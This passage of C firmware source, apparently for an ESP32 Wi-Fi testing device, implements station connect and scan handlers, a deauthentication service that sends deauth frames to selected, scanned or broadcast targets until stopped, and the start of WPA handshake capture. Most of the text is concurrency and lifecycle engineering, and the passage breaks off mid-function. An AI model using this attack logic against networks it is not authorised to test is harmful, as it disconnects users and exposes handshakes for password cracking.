    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, STA_SCAN_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    uint32_t my_token = req.operation_token, my_epoch = ctx->boot_epoch;

    /* Already terminal (natural completion, or an earlier STOP call,
     * already ran) -- nothing to signal or wait for. */
    if (mtk_op_snapshot(my_token, my_epoch, &snap)) {
        if (mtk_op_state_is_terminal(snap.state)) {
            mtk_sta_scan_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
            respond(ctx, MTK_STATUS_OK, &r, &mtk_sta_scan_stop_resp_t_desc);
            return;
        }
    } else {
        /* Not found under the real (mtk_core-internal) token/epoch pair
         * any more -- op_is_terminal_now's own fail-safe convention: treat
         * as already terminal rather than wait for something that no
         * longer exists. */
        mtk_sta_scan_stop_resp_t r; memset(&r, 0, sizeof(r));
        respond(ctx, MTK_STATUS_OK, &r, &mtk_sta_scan_stop_resp_t_desc);
        return;
    }

    /* Signal cancellation -- if a real async runner has this operation's
     * own sta_scan call still blocked on another task, this makes it
     * return within one short poll interval instead of up to the full
     * requested duration (see mtek_wifi_hal_esp32.c's own esp32_sta_scan/
     * esp32_sta_scan_cancel). Harmless no-op if nothing is actually in
     * flight (the synchronous, no-async-runner fallback every single-
     * threaded host test uses) or if the HAL predates this (NULL-safe). */
    if (s_hal && s_hal->sta_scan_cancel) s_hal->sta_scan_cancel();

    /* Bounded wait for handle_sta_scan_start's own worker to reach a
     * terminal state -- it alone performs restore/release for this
     * opcode, exactly once, when it gets there. ~20 x 50ms = 1s bound:
     * generous relative to esp32_sta_scan's own 100ms poll interval plus
     * its own bounded teardown, while still failing safe rather than
     * blocking indefinitely if the worker is somehow wedged. */
    const int max_iters = 20;
    int became_terminal = 0;
    for (int i = 0; i < max_iters; i++) {
        if (mtk_op_snapshot(my_token, my_epoch, &snap) && mtk_op_state_is_terminal(snap.state)) { became_terminal = 1; break; }
        if (!mtk_op_snapshot(my_token, my_epoch, &snap)) { became_terminal = 1; break; } /* fail-safe: gone means terminal */
        if (s_hal && s_hal->quiescence_wait_ms) s_hal->quiescence_wait_ms(50);
    }

    if (became_terminal) {
        mtk_sta_scan_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
        respond(ctx, MTK_STATUS_OK, &r, &mtk_sta_scan_stop_resp_t_desc);
    } else {
        /* Bounded timeout expired and the worker still has not reached a
         * terminal state -- it may still be touching the radio. Do NOT
         * claim STOPPED, do NOT touch restore/arbiter (that remains the
         * worker's own job alone): report BUSY so the caller knows to
         * retry STATUS/STOP rather than assume the radio is free. */
        mtk_sta_scan_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
        respond(ctx, MTK_STATUS_BUSY, &r, &mtk_sta_scan_stop_resp_t_desc);
    }
}

/* STA_CONNECT / STA_DISCONNECT / STA_STATUS ------------ */

static uint8_t s_sta_connected;

/* (audit extended to s_sta_connected too): this file's own established
 * wifi_lock/unlock protects the single write/read pair below the same way it now
 * protects s_ap/s_sta. */
int mtek_wifi_is_sta_connected(void) { wifi_lock(); int c = s_sta_connected; wifi_unlock(); return c; }

static void handle_sta_connect(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                const uint8_t *req_bytes, size_t req_len) {
    mtk_sta_connect_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    if (req.ssid.len == 0 || (req.credential.kind == 0 && req.auth_mode != 0)) {
        respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return;
    }
    if (req.persistence == 1 /* PERSISTENT */) { respond_empty(ctx, MTK_STATUS_UNSUPPORTED); return; }
    /* See handle_ap_scan_start's identical comment above. */
    if (!mtk_op_begin_admission_guard(ctx->session_generation)) { respond_empty(ctx, MTK_STATUS_NOT_READY); return; }
    int no_mem = 0;
    /* The identity is copied out atomically at mint time -- no raw record
     * pointer is retained past this point, including across the ACCEPTED
     * response and the (potentially long, up to connect_timeout_ms) HAL connect
     * call below. */
    mtk_op_id_t id = mtk_op_alloc_id(op->service_id, op->opcode, now_ms(), &no_mem);
    if (id.token == 0) { respond_empty(ctx, MTK_STATUS_NO_MEMORY); mtk_op_end_admission_guard(); return; }
    if (mtk_arbiter_acquire(MTK_ARB_WMC, id.token) != MTK_ARB_GRANT_OK) {
        mtk_op_discard_unpublished(id.token, id.boot_epoch);
        respond_empty(ctx, MTK_STATUS_BUSY);
        mtk_op_end_admission_guard();
        return;
    }
    mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_RUNNING, MTK_STATUS_OK, now_ms());

    mtk_sta_connect_resp_t r; r.operation_token = id.token;
    respond(ctx, MTK_STATUS_ACCEPTED, &r, &mtk_sta_connect_resp_t_desc);
    mtk_op_end_admission_guard();

    uint32_t timeout = req.connect_timeout_ms ? req.connect_timeout_ms : 15000;
    mtk_hal_connect_result_t cres = {0};
    int rc = -1;
    if (s_hal && s_hal->connect) {
        rc = s_hal->connect(req.ssid.data, (uint8_t)req.ssid.len, to_hal_mac(req.bssid_hint), req.channel_hint,
                             req.auth_mode, req.credential.psk.data, (uint8_t)req.credential.psk.len,
                             req.ip_config.mode, to_hal_ip(req.ip_config.static_ip),
                             to_hal_ip(req.ip_config.static_netmask), to_hal_ip(req.ip_config.static_gateway),
                             timeout, &cres);
    }
    /* mtk_arbiter_release(cls) alone only checks the CLASS, never WHICH
     * operation holds it -- an unconditional release here (this call's own
     * connect above has no cancel hook and can block for up to `timeout`) could
     * otherwise tear down a BRAND-NEW STA_CONNECT's own lease if a peer-session
     * reset already reclaimed/reassigned MTK_ARB_WMC to that newer operation
     * while this worker was still blocked.
     *
     * The ownership check and the release now happen atomically, in ONE arbiter
     * lock acquisition (mtk_arbiter_release_if_owner), instead of a separate
     * `mtk_arbiter_ active_token == id.token` check followed by a separate `mtk_
     * arbiter_release` call -- closing the real (if narrow) window between those
     * two calls where a concurrent reassignment could have been released out
     * from under a newer operation. */
    mtk_arbiter_release_if_owner(MTK_ARB_WMC, id.token);

    uint8_t connected_now = (rc == 0 && cres.connected);
    mtk_op_state_t final_state;
    uint8_t final_status;
    if (connected_now) { final_state = MTK_OPS_COMPLETED; final_status = MTK_STATUS_OK; }
    else if (cres.timed_out) { final_state = MTK_OPS_TIMED_OUT; final_status = MTK_STATUS_TIMEOUT; }
    else { final_state = MTK_OPS_FAILED; final_status = MTK_STATUS_IO_ERROR; }

    /* Gate EVERYTHING else externally visible (s_sta_connected publish, the
     * STA_CONNECT_COMPLETE event) on actually WINNING this transition -- never
     * publish/emit on behalf of a token a concurrent peer-session reset already
     * invalidated.
     *
     * Winning the transition alone only proves nobody else finalized this token
     * before this exact instant -- it says nothing about a peer-session reset
     * landing in the narrow window between winning and actually
     * publishing/emitting below. A single point-in- time re-check cannot close
     * that window either (it only proves the generation had not YET changed the
     * instant it ran -- a reset can still land between the check returning and
     * the state write/event emit below actually executing).
     * mtk_op_begin_publish_guard makes "check" and "the generation changing"
     * genuinely mutually exclusive instead: it is held across the ENTIRE publish
     * (state write AND event emission) and is backed by the SAME lock
     * mtk_core_bump_ session_generation itself briefly holds, so a bump cannot
     * complete while this is open. `won` still stands regardless (the transition
     * already happened and must not be undone) -- only publish is gated on the
     * guard. */
    int won = mtk_op_transition_by_token(id.token, id.boot_epoch, final_state, final_status, now_ms());
    int guard_open = won && mtk_op_begin_publish_guard(ctx->session_generation);
    if (guard_open) {
        mtk_sta_connect_complete_ev_t ev = {0}; ev.operation_token = id.token;
        if (connected_now) {
            wifi_lock(); s_sta_connected = 1; wifi_unlock();
            ev.status = MTK_STATUS_OK; ev.bssid = from_hal_mac(cres.bssid); ev.channel = cres.channel;
            ev.ip_present = cres.ip_present; ev.ip_addr = from_hal_ip(cres.ip);
        } else if (cres.timed_out) {
            ev.status = MTK_STATUS_TIMEOUT;
        } else {
            ev.status = MTK_STATUS_IO_ERROR;
        }
        ctx->sink.emit_event(ctx->sink.user, id.token, "STA_CONNECT_COMPLETE", &ev, &mtk_sta_connect_complete_ev_t_desc);
        mtk_op_end_publish_guard();
    } else if (connected_now) {
        /* Lost the race, OR won it but the session went stale before we
         * could publish -- either way, that real HAL-level association
         * is now untracked by the canonical layer (s_sta_connected was
         * never set) and must not be left silently attached with no way
         * to ever disconnect it again. */
        if (s_hal && s_hal->disconnect) s_hal->disconnect();
    }
}

static void handle_sta_disconnect(mtk_request_ctx_t *ctx) {
    /* MTK_ARB_WMC is only ever held for the duration of an in-progress connect
     * ATTEMPT itself (handle_sta_ connect's own established design, above) -- by
     * the time a session is genuinely connected (s_sta_connected true), the
     * class has ALWAYS already been released, regardless of whether the attempt
     * succeeded or failed. So there is never a legitimate reason for this
     * handler to touch the arbiter directly: if WMC is still held when this
     * runs, a connect attempt is genuinely still in flight on another thread
     * (connect has no cancel hook) and releasing it now would let a brand-new
     * STA_CONNECT start a second, overlapping connect call; if WMC is already
     * free, there is nothing to release. Disconnect/HAL teardown is likewise
     * gated on genuinely being connected -- calling disconnect while nothing is
     * connected (or while a connect attempt is still resolving) is not
     * meaningful and no longer attempted. */
    wifi_lock();
    uint8_t was_connected = s_sta_connected;
    if (was_connected) s_sta_connected = 0;
    wifi_unlock();
    if (was_connected && s_hal && s_hal->disconnect) s_hal->disconnect();
    respond_empty(ctx, MTK_STATUS_OK);
}

static void handle_sta_status(mtk_request_ctx_t *ctx) {
    mtk_hal_sta_status_t st = {0};
    if (s_hal && s_hal->get_status) s_hal->get_status(&st);
    mtk_sta_status_resp_t r; memset(&r, 0, sizeof(r));
    r.connected = st.connected;
    r.ssid.len = st.ssid_len; memcpy(r.ssid.data, st.ssid, st.ssid_len);
    r.bssid = from_hal_mac(st.bssid);
    r.channel = st.channel;
    r.ip_present = st.ip_present;
    r.ip_addr = from_hal_ip(st.ip);
    r.rssi = st.rssi;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_sta_status_resp_t_desc);
}

/* Deauthentication (List B, 3 modes) ---------------- */

static int mac_is_zero(mtk_mac6_t m) { for (int i=0;i<6;i++) if (m.b[i]) return 0; return 1; }
static int mac_is_multicast(mtk_mac6_t m) { return (m.b[0] & 0x01) != 0; }

/* Live progress for a still-RUNNING operation (DEAUTH_STATUS's own `sent` field
 * used to always report 0, and count=0/"until stopped" completed after a single
 * round-robin pass instead of genuinely running until STOP). Session-scoped
 * (matches the arbiter's single-active-D-class model: at most one deauth
 * operation runs at a time), read by handle_deauth_status below. */
/* Stores the TOKEN, not a retained `mtk_operation_record_t *` -- the record's
 * own table slot can be evicted (GC, MTK_OP_RETENTION_MS after this operation
 * went terminal) and later reused by a COMPLETELY different, unrelated operation
 * at the exact same address. Comparing a retained pointer's identity against a
 * freshly-`mtk_op_find`-ed one (as this used to) would then wrongly match that
 * unrelated operation's own valid token to this stale session, reporting THIS
 * session's leftover total_sent as if it were the new operation's live progress
 * -- a classic ABA hazard. A token is effectively unique for the life of the
 * boot session (mtk_core.c's alloc_token is a monotonic, never-repeating
 * counter), so comparing by token instead is immune to slot reuse. */
static struct { uint32_t token; uint32_t total_sent; } s_deauth;

/* (same defect and same fix shape as mtek_capture_ service.h's own
 * capture_teardown and this file's own handshake_finish, above): the natural
 * loop-exit path and handle_deauth_stop used to call mtk_op_transition directly,
 * locking in `status` as the record's own final_status BEFORE restore_sta_mode's
 * real result was known (a DEAUTH_STATUS query racing either path could observe
 * a final_status of OK that the DEAUTH_STOPPED event's own separately-computed
 * field simultaneously contradicted), and released the arbiter unconditionally
 * regardless of restore's own result -- defeating mekt_wifi_restore_and_
 * release's own "quarantine on failure, never release" contract for this opcode
 * specifically. Claims the single finalization path (mtk_op_claim_finalization),
 * performs the real cleanup via that shared wrapper, THEN writes the one
 * truthful terminal state/status -- never the other order. Returns 1 (and writes
 * *out_final_status) only if THIS call actually performed finalization; 0 if it
 * lost the race (another path already has, or is already doing so). */
static int deauth_finalize(uint32_t token, uint32_t boot_epoch, mtk_op_state_t final_state,
                            uint8_t status, uint8_t *out_final_status) {
    if (!mtk_op_claim_finalization(token, boot_epoch)) return 0;
    int restore_rc = mtek_wifi_restore_and_release(MTK_ARB_D, token);
    uint8_t final_status = (restore_rc == 0) ? status : MTK_STATUS_IO_ERROR;
    mtk_op_transition_by_token(token, boot_epoch, final_state, final_status, now_ms());
    if (out_final_status) *out_final_status = final_status;
    return 1;
}

static void handle_deauth_start(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                 const uint8_t *req_bytes, size_t req_len) {
    mtk_deauth_start_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }

    mtk_mac6_t targets[64]; unsigned target_count = 0; mtk_mac6_t ap_bssid; uint8_t channel;
    if (req.target_mode == 0) { /* SELECTED */
        if (req.station_scan_token != 0) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
        if (mac_is_zero(req.ap_bssid) || mac_is_multicast(req.ap_bssid)) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
        if (req.channel < 1 || req.channel > 13) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
        if (req.targets.count == 0 || req.targets.count > 64) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
        for (uint32_t i = 0; i < req.targets.count; i++) {
            mtk_mac6_t t = req.targets.items[i];
            if (mac_is_zero(t) || mac_is_multicast(t)) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
            for (unsigned j = 0; j < i; j++)
                if (memcmp(req.targets.items[j].b, t.b, 6) == 0) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
        }
        target_count = req.targets.count;
        memcpy(targets, req.targets.items, target_count * sizeof(mtk_mac6_t));
        ap_bssid = req.ap_bssid; channel = req.channel;
    } else if (req.target_mode == 1) { /* ALL_SCANNED */
        if (req.station_scan_token != s_sta.generation || s_sta.generation == 0) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
        if (s_sta.count == 0) { respond_empty(ctx, MTK_STATUS_NOT_READY); return; }
        if (s_sta.count > 64) { respond_empty(ctx, MTK_STATUS_OVERFLOW); return; }
        target_count = s_sta.count;
        for (unsigned i = 0; i < target_count; i++) targets[i] = s_sta.items[i].mac;
        ap_bssid = s_sta.ap_bssid; channel = s_sta.channel;
    } else if (req.target_mode == 2) { /* BROADCAST */
        if (mac_is_zero(req.ap_bssid) || mac_is_multicast(req.ap_bssid)) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
        if (req.channel < 1 || req.channel > 13) { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }
        target_count = 1;
        memset(targets[0].b, 0xFF, 6);
        ap_bssid = req.ap_bssid; channel = req.channel;
    } else { respond_empty(ctx, MTK_STATUS_INVALID_ARGUMENT); return; }

    /* See handle_ap_scan_start's identical comment above. MTK_ARB_D is GUARDED
     * with MTK_ARB_H (the only class it is ever GUARDED against), but D->H is
     * the ONLY direction actually permits a bounded stop-then-acquire handoff
     * for -- see handle_handshake_ start's own D->H handling. DEAUTH_START
     * seeing H already active (the reverse direction) has no such contract: M3
     * correction (independent review P0 "reverse H->D direction is incorrectly
     * treated as the permitted D->H handoff") -- GUARDED is now rejected exactly
     * like BUSY, immediately below, never force-transferred. */
    if (!mtk_op_begin_admission_guard(ctx->session_generation)) { respond_empty(ctx, MTK_STATUS_NOT_READY); return; }
    int no_mem = 0;
    /* The identity is copied out atomically at mint time -- no raw record
     * pointer is retained past this point; my_token/my_epoch below (this
     * function's own already-established token/epoch-only convention for its
     * long-running send loop) are simply this identity's own fields. */
    mtk_op_id_t id = mtk_op_alloc_id(op->service_id, op->opcode, now_ms(), &no_mem);
    if (id.token == 0) { respond_empty(ctx, MTK_STATUS_NO_MEMORY); mtk_op_end_admission_guard(); return; }
    /* M3 correction (independent review P0 "reverse H->D direction is
     * incorrectly treated as the permitted D->H handoff"): 002-resource-
     * arbiter.md Sec 3.1 and mtk_arbiter_grant_t's own doc comment name
     * D->H as the ONLY guarded direction in Phase 1 -- the policy lookup
     * for the {D, H} pair is symmetric, though, so DEAUTH_START seeing H
     * already active ALSO receives MTK_ARB_GRANT_GUARDED here, exactly
     * like H seeing D active. Treating that as permission to force_
     * transfer would silently implement the forbidden reverse H->D
     * takeover -- orphaning the live handshake's own radio state and
     * operation record, which nothing would ever finalize. DEAUTH_START
     * has no bounded-handoff contract for this direction at all, so a
     * GUARDED result here is rejected exactly like BUSY: the arbiter has
     * not granted, and H's own class/token/state are left completely
     * untouched. */
    mtk_arbiter_grant_t g = mtk_arbiter_acquire(MTK_ARB_D, id.token);
    if (g == MTK_ARB_GRANT_BUSY || g == MTK_ARB_GRANT_GUARDED) {
        mtk_op_discard_unpublished(id.token, id.boot_epoch);
        respond_empty(ctx, MTK_STATUS_BUSY);
        mtk_op_end_admission_guard();
        return;
    }
    mtk_op_transition_by_token(id.token, id.boot_epoch, MTK_OPS_RUNNING, MTK_STATUS_OK, now_ms());

    /* M2 independent-review correction (addendum P0 "cancellation-visible state
     * is still published after the guard"): s_deauth's own token MUST be
     * committed before ACCEPTED/before the guard unlocks -- a peer-session reset
     * that acquires the guard immediately after mtk_op_end_admission_guard
     * (below) reads s_deauth at the coherent- reader sites
     * (mtek_wifi_cancel_active_for_peer_reset, handle_get_wifi_recovery_state)
     * to decide what to cancel/report; if that ran before this write, it would
     * act on stale (zero/previous- session) s_deauth state while this worker
     * then overwrote it with the now-canceled token's own identity moments
     * later. */
    wifi_lock();
    memset(&s_deauth, 0, sizeof(s_deauth));
    s_deauth.token = id.token;
    wifi_unlock();

    mtk_deauth_start_resp_t r; r.operation_token = id.token;
    respond(ctx, MTK_STATUS_ACCEPTED, &r, &mtk_deauth_start_resp_t_desc);
    mtk_op_end_admission_guard();

    /* total_sent counts HAL-confirmed successful transmissions only (the HAL
     * return value is checked, never discarded) -- a TX failure (e.g.
     * esp_wifi_80211_tx rejecting an unsupported frame type on the real target,
     * see mtek_wifi_hal_esp32.c) is tracked separately and never silently folded
     * into a "sent" count.
     *
     * count=0 ("run until stopped",) genuinely runs until STOP transitions
     * rec->state to terminal, WHEN this handler is actually executing on a
     * deferred background worker -- true on every real target build, where the
     * router's async runner is registered once, early, before any dispatch can
     * occur (main/mtek_spi_runtime.c), so a genuinely long-running loop here
     * never blocks the transport's own request-dispatch loop, which remains free
     * to receive and dispatch the concurrent STOP that ends it.
     * mtk_router_running_on_worker (thread-local -- correct even with up to 4
     * concurrent deferred operations) distinguishes that from running
     * synchronously on the calling thread -- whether because no runner is
     * registered at all (every host test that does not itself register one,
     * matching the deterministic single- threaded model the rest of this suite
     * relies on) or because the dispatching adapter is FACTORY_UART, which
     * mtk_router_dispatch's own transport-aware gate never defers even when a
     * runner is registered (see mtek_router.c): blocking
     * indefinitely in either case would hang the caller forever with no way for
     * any STOP to ever reach it, so both intentionally fall back to one bounded
     * round-robin pass -- an honest reflection of "this call has no mechanism
     * available to run in the background", not a silent behavior gap. A bounded
     * per-round pacing delay (s_hal->pace_delay_ms, NULL-safe) keeps a genuinely
     * continuous operation from spinning a CPU core and gives the terminal-state
     * check below a real, frequent chance to observe a concurrent STOP promptly,
     * rather than only between whole target-set passes. The per-target-per-round
     * transmit cadence itself is a disclosed engineering choice (not an
     * independently confirmed timing value from the accepted facts package): one
     * full target-set round, then a short pace delay, repeated. */
    uint32_t total_sent = 0, total_failed = 0, attempted = 0;
    uint32_t budget = req.count; /* 0 = run until stopped */
    int can_run_background = mtk_router_running_on_worker();
    /* This token/boot_epoch pair (id, copied out atomically at mint time -- see
     * mtk_op_alloc_id's own doc comment) is immutable for the operation's whole
     * lifetime and is then used for every "should I keep going" check below via
     * a locked snapshot (op_is_terminal_now), never a raw pointer/state
     * dereference retained across this loop's many iterations. */
    /* my_epoch is id.boot_epoch (the mtk_core-internal epoch this record was
     * actually allocated under, i.e. mtk_core_boot_epoch at alloc time) -- NOT
     * ctx->boot_epoch, which is the CALLING TRANSPORT's own link/peer epoch
     * (e.g. native SPI v1's own dctx->boot_epoch, independently reset on a peer
     * HELLO -- see mtek_spi_native_dispatch.c's own epoch-reset fix). These are
     * two genuinely independent epoch concepts; mtk_op_snapshot validates
     * against the former, and passing the latter here would make every snapshot
     * lookup spuriously fail (mismatched epoch => "not found" =>
     * op_is_terminal_now's own fail-safe treats it as already terminal),
     * silently skipping this operation's own send loop entirely -- a real bug
     * the TSan-driven fix introduced and caught before it shipped. */
    uint32_t my_token = id.token, my_epoch = id.boot_epoch;
    while (!op_is_terminal_now(my_token, my_epoch)) {
        for (unsigned i = 0; i < target_count && !op_is_terminal_now(my_token, my_epoch); i++) {
            int rc = -1;
            if (s_hal && s_hal->send_deauth) rc = s_hal->send_deauth(to_hal_mac(ap_bssid), to_hal_mac(targets[i]), channel);
            if (rc == 0) total_sent++; else total_failed++;
            attempted++;
            wifi_lock();
            s_deauth.total_sent = total_sent;
            wifi_unlock();
            if (budget && attempted >= budget) goto deauth_loop_done;
        }
        if (op_is_terminal_now(my_token, my_epoch)) break;
        /* count=0 with no background execution context available: one
         * round-robin pass is the most this call can honestly do (see
         * the doc comment above) -- stop here rather than spinning
         * forever on the calling thread with no way for STOP to ever
         * reach it. */
        if (!budget && !can_run_background) break;
        if (s_hal && s_hal->pace_delay_ms) s_hal->pace_delay_ms(100);
    }
deauth_loop_done:
    (void)total_failed; /* visible to a debugger/future diagnostics wiring; the wire schema has no dedicated field for it (frozen contract) */
    /* "STOP and worker paths can both restore the radio, release the arbiter,
     * and emit lifecycle output." Whichever of this natural loop-exit and a
     * concurrent handle_deauth_stop call (on a different worker/task) wins
     * deauth_finalize's own mtk_op_claim_ finalization is the ONLY one that
     * performs cleanup below. Losing this race means handle_deauth_stop already
     * did every one of these exact steps -- doing them again here would
     * double-release the arbiter (potentially releasing a DIFFERENT operation's
     * now-active lease), double-restore the radio, and double-emit
     * DEAUTH_STOPPED to a real peer. */
    {
        uint8_t final_status;
        /* deauth_finalize winning only proves nobody else finalized this token
         * BEFORE this exact instant -- a peer-session reset can still land in
         * the window between winning and actually emitting DEAUTH_STOPPED below.
         * mtk_op_begin_publish_guard, held across the whole publish, closes that
         * window (see its own doc comment in mtek_core.h). ctx is this same,
         * still-in-scope request's own context (this long-running send loop and
         * its own finalize tail share one call frame -- no separate long-lived
         * session struct is needed here to carry a session_generation the way
         * s_hs/s_cap/s_sig/ s_gatt below do). */
        int won = deauth_finalize(my_token, my_epoch, MTK_OPS_COMPLETED, MTK_STATUS_OK, &final_status);
        if (won && mtk_op_begin_publish_guard(ctx->session_generation)) {
            mtk_deauth_stopped_ev_t ev = {0}; ev.operation_token = my_token;
            ev.status = final_status; ev.total_sent = total_sent;
            ctx->sink.emit_event(ctx->sink.user, my_token, "DEAUTH_STOPPED", &ev, &mtk_deauth_stopped_ev_t_desc);
            mtk_op_end_publish_guard();
        }
    }
}

static void handle_deauth_stop(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                const uint8_t *req_bytes, size_t req_len) {
    mtk_deauth_stop_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t precheck_snap;
    /* Family gate (DEAUTH_START) -- a non-DEAUTH token is rejected NOT_FOUND
     * before deauth_finalize could ever claim, clean up, or transition a foreign
     * operation. */
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, DEAUTH_START_OPCODE, &precheck_snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    /* Same linearization as handle_deauth_start's own loop-exit above:
     * deauth_finalize's own mtk_op_claim_finalization is the single
     * source of truth for "did THIS call win the race to finalize this
     * operation" -- only the winner runs cleanup. STOP itself never emits
     * DEAUTH_STOPPED (matching this opcode's own established design: STOP
     * gets a synchronous direct response instead; the event is reserved
     * for a background/natural completion nobody is synchronously
     * waiting on). */
    deauth_finalize(req.operation_token, ctx->boot_epoch, MTK_OPS_STOPPED, MTK_STATUS_OK, NULL);
    /* A fresh locked snapshot (not a raw rec->state/final_status read) is the
     * only honest way to report the operation's real current state --
     * deauth_finalize may have lost the claim race to a concurrent natural
     * loop-exit that has not yet finished writing the truthful terminal status. */
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, DEAUTH_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    mtk_deauth_stop_resp_t r; r.final_state = (uint8_t)snap.state; r.final_status = snap.final_status;
    respond(ctx, MTK_STATUS_OK, &r, &mtk_deauth_stop_resp_t_desc);
}

static void handle_deauth_status(mtk_request_ctx_t *ctx, const mtk_opcode_entry_t *op,
                                  const uint8_t *req_bytes, size_t req_len) {
    mtk_deauth_status_req_t req; memset(&req, 0, sizeof(req));
    if (mtk_decode(op->req_desc, &req, req_bytes, req_len, NULL) != MTK_CODEC_OK) { respond_empty(ctx, MTK_STATUS_PROTOCOL_ERROR); return; }
    mtk_operation_record_t snap;
    if (!mtk_op_snapshot_family(req.operation_token, ctx->boot_epoch, WIFI_SERVICE_ID, DEAUTH_START_OPCODE, &snap)) { respond_empty(ctx, MTK_STATUS_NOT_FOUND); return; }
    /* Real live progress for a still-RUNNING operation (was always 0), matched
     * by token identity against the single session-scoped s_deauth (the
     * arbiter's single-active-D-class model means at most one deauth operation
     * is ever RUNNING, so a stale s_deauth from a prior, now-terminal operation
     * is never misreported here). */
    mtk_deauth_status_resp_t r; r.state = (uint8_t)snap.state;
    wifi_lock();
    r.sent = (s_deauth.token == req.operation_token) ? s_deauth.total_sent : 0;
    wifi_unlock();
    respond(ctx, MTK_STATUS_OK, &r, &mtk_deauth_status_resp_t_desc);
}

/* WPA handshake capture ---------------------- */

typedef struct {
    /* RC5 independent audit P0 "Long-lived Wi-Fi/BLE callbacks retain
     * invalid request context": this used to store `mtk_request_ctx_t
     * *ctx` -- a raw pointer into whatever transient storage the
     * dispatching adapter/router happened to hand handle_handshake_start
     * (a UART handler's own stack frame, or the router's async-pool slot,
     * which is released and reusable the instant that handler returns).
     * The real target's promiscuous-mode callback (hs_frame_cb below)
     * fires later, from the Wi-Fi driver's own task, well after that
     * storage is gone or reused for an unrelated operation -- a genuine
     * use-after-return/use-after-reuse. Storing a byte-for-byte VALUE
     * COPY of just the sink here (matching the pattern already used
     * safely by s_sig/s_gatt below) removes the dependency on the
     * dispatching call's own stack/pool-slot lifetime entirely: the
     * function-pointer table and the `user` pointer it captures are
     * copied once, at session-start time, and nothing about this struct
     * depends on `ctx` (the argument) remaining valid a moment longer.
     * `sink.user` itself must still point to storage that outlives this
     * operation -- every adapter capable of originating an operation with
     * a delayed HAL callback (native SPI/Legacy SPI Compatibility persistent event queues,
     * or the UART REPL's persistent per-session capture, see
     * mtek_uart_adapter.c) is responsible for supplying that. */
    mtk_sink_t sink;
    /* TOKEN, not a retained `mtk_operation_record_t *` -- see s_deauth's own
     * matching doc comment above for the full ABA-hazard rationale (the stakes
     * are higher here: the buf/len are read by handle_handshake_status/_read
     * keyed only on the CALLER's requested token matching a fresh mtk_op_find,
     * with no check at all that it still refers to THIS session before this fix
     * -- a stale/reused slot could otherwise return one operation's captured
     * bytes attributed to a completely different one). hs_frame_cb re-resolves
     * this to a live record via mtk_op_find each time it needs one, rather than
     * holding a pointer across its own callback invocations. */
    uint32_t token;
    uint32_t boot_epoch;
    /* The session_generation this operation was ORIGINALLY admitted under
     * (mtk_request_ctx_t's own field, 0 for every non-native-SPI adapter --
     * never fenced), captured once at handle_handshake_start time, alongside
     * token/boot_epoch/sink. Both hs_frame_cb (a genuine background driver
     * callback that can fire long after the request that armed it has returned)
     * and handshake_finish read THIS stored value -- never a caller's own
     * ctx->session_generation, which for hs_frame_cb does not even exist (no
     * request context at all) and for handle_handshake_stop would be the STOP
     * caller's own session, not this long-lived session's originating one. */
    uint32_t session_generation;
    uint8_t seen_mask; /* bit(n-1) set once message n classified */
    uint8_t buf[HANDSHAKE_MAX_BYTES];
    uint32_t len;
    /* The target AP's BSSID from the HANDSHAKE_START request -- without this,
     * any EAPOL- Key frame from ANY nearby network sharing the same channel
     * would be accepted into this capture, not just the one the caller asked
     * for. */
    mtk_mac6_t target_bssid;
    uint8_t channel;
} handshake_session_t;
static handshake_session_t s_hs;

/* True if any of the frame's three 802.11 address fields (addr1/addr2/addr3 --
 * the same from/to/BSSID convention already established for MonstaShark's own
 * BSSID filter, mtek_capture_logic.c's frame_matches_filter) name the target
 * BSSID, so a 4-way handshake exchanged between the target AP and ANY of its
 * associated stations is captured, not just traffic addressed exactly one
 * specific direction. */
static int frame_matches_target_bssid(const uint8_t *f, uint16_t len, mtk_mac6_t target_bssid) {
    if (len < 16 + 6) return 0; /* too short to carry addr3 */
    return memcmp(f + 4, target_bssid.b, 6) == 0
        || memcmp(f + 10, target_bssid.b, 6) == 0
        || memcmp(f + 16, target_bssid.b, 6) == 0;
}

/* Classifies one captured 802.11 frame as an EAPOL-Key message 1..4, or 0
 * if not an EAPOL-Key frame. Minimal, direct 802.11/EAPOL parse -- no
 * native-structure casting, explicit byte offsets only (802.11-2020
 * Sec 12.7.2 Key Information field). */
static int classify_eapol(const uint8_t *f, uint16_t len) {
